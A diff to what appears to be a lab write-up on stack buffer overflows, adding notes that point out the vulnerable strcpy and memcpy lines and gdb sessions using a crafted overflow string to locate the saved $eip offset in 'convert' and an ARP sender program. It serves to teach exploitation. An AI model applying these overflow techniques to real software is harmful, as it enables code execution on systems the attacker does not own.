@@ -28,6 +28,11 @@ Program Headers:
 `GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4` this line indicated that the Stack is Read-Write but not executable, so we have one defensive mechanism to bypass.
 
 ###### Determine the size of the buffer to override the instruction pointer `$eip`
+This is the line which can be used for overflowing the `date` buffer:
+```
+strcpy(date, argv[2]);
+```
+Let's explore the memory!
 ```
 $ gdb convert
 (gdb) run 1 $(perl -e 'print "A"x744 . "B"x4 . "C"x4 . "D"x4')
@@ -107,6 +112,16 @@ Program Headers:
   ....           ......   ......     ......     ......  ......  . . ...
 ```
 `GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE  0x4` this line indicated that the Stack is Read-Write and executable, so this defensive mechanism is disabled.
+
+###### Determine the strategy to overwrite the `$eip` pointer
+This are the lines/variables that will be used to exploit the program:
+````
+memcpy(hwaddr.addr, packet + ADDR_OFFSET, hwaddr.len);
+memcpy(hwaddr.hwtype, packet, 4);
+
+````
+Let's explore the memory!
+
 ````
 (gdb) break print_address
 (gdb) run packet.txt
@@ -134,3 +149,5 @@ Stack level 0, frame at 0xbffff500:
  Saved registers:
   ebp at 0xbffff4f8, eip at 0xbffff4fc
 ````
+###### Sketch memory layout
+<img src="https://github.com/igavriil/buffer-overflow/blob/master/arpsender_sketch.png" width="400" height="300" />
